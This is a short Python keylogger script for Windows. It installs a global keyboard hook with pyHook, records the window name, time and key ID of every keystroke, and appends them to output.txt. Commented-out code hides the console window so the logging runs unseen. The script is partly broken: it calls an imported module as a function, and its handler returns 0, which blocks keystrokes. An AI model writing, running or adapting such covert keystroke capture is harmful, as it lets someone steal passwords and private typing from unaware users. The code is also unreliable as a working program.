import win32api
import win32console
import win32gui
import pythoncom, pyHook
import processing as p
'''
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0) //3 for max size
# https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
# http://pyhook.sourceforge.net/doc_1.5.0/pyhook.HookManager.KeyboardEvent-class.html
# http://www.asciitable.com/
'''


'''
    print 'MessageName:',event.MessageName
    print 'Message:',event.Message
    print 'Time:',event.Time
    print 'Window:',event.Window
    print 'WindowName:',event.WindowName
    print 'Ascii:', event.Ascii, chr(event.Ascii)
    print 'Key:', event.Key
    print 'KeyID:', event.KeyID
    print 'ScanCode:', event.ScanCode
    print 'Extended:', event.Extended
    print 'Injected:', event.Injected
    print 'Alt', event.Alt
    print 'Transition', event.Transition
    print '---'

'''
def OnKeyboardEvent(event):
    data = (event.WindowName, event.Window, event.Time, event.Ascii, event.Key, event.Alt, event.KeyID)
    print(data)
    print(chr(event.KeyID))

    # open output.txt to read current keystrokes
    f = open('output.txt', 'r+')
    buffer = f.read()
    f.close()

    keylogs_ID = event.KeyID
    #do the flitering here

    if event.KeyID == 13: # enter pressed
        keylogs = '\n'
    buffer += p(keylogs_ID)

    # open output.txt to write current + new keystrokes
    f = open('output.txt', 'w')
    f.write(buffer)
    f.close()
    return 0
    '''
    if event.Ascii == 5:
        _exit(1)
    
    
    if (event.Ascii > 31 and event.Ascii < 127) or event.Ascii == 13 or event.Ascii == 9:
        data = (event.WindowName, event.Window, event.Time, event.Ascii, event.Key, event.Alt)
        keylogs = chr(event.Ascii)
        print(data) # debugging
        print(keylogs)
    '''


# create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()